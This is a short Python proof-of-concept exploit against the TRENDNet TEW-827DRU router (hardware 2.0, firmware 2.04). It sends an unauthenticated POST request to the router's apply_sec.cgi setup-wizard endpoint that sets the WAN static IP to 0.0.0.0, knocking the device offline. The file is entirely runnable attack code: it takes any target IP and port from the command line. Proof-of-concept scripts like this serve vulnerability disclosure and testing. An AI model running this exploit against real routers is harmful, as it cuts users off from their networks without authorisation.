#!/usr/bin/python3
"""
This script exercises a vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 in which an unauthenticated user can
call setup wizard functionality. A static IP address of 0.0.0.0 is set to cause a denial of service.

The packet is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import argparse


def create_dos_packet(host, port):
    """
    Generate a packet that causing the WAN IP to be set to 0.0.0.0

    :param host: Target IP address.
    :type host: str

    :param port: Target listening port.
    :type port: int

    :return: Packet to send to target.
    :rtype: bytes
    """
    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'static',
            b'cameo.wan.wan_static_ipaddr': b'0.0.0.0'}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def dos_target(host, port):
    """
    Send packet to target causing a denial of service.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int
    """
    packet = create_dos_packet(host, port)

    mow.send_packet(host, port, packet)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated request made to TRENDNet TEW-827DRU causing a denial '
                                                 'of service.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)

    args = parser.parse_args()

    dos_target(args.ip, args.port)
